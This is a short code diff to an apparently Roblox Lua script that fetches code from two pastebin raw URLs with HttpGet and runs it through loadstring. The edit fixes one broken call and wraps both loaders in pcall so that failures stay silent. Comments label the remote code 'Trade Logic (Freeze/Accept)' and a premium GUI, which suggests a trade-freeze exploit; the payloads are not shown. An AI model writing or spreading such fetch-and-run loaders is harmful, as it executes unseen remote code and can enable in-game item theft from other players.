@@ -1,7 +1,13 @@
+-- Runs the Trade Logic (Freeze/Accept)
 task.spawn(function()
-  loadstring(game:https://"https://pastebin.com/raw/Mwc1v239"))()
+    pcall(function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/Mwc1v239"))()
+    end)
 end)
 
+-- Runs the Premium Blue GUI / Visuals
 task.spawn(function()
-   loadstring(game:HttpGet("https://pastebin.com/raw/mR7jQX5e"))()
+    pcall(function()
+        loadstring(game:HttpGet("https://pastebin.com/raw/mR7jQX5e"))()
+    end)
 end)
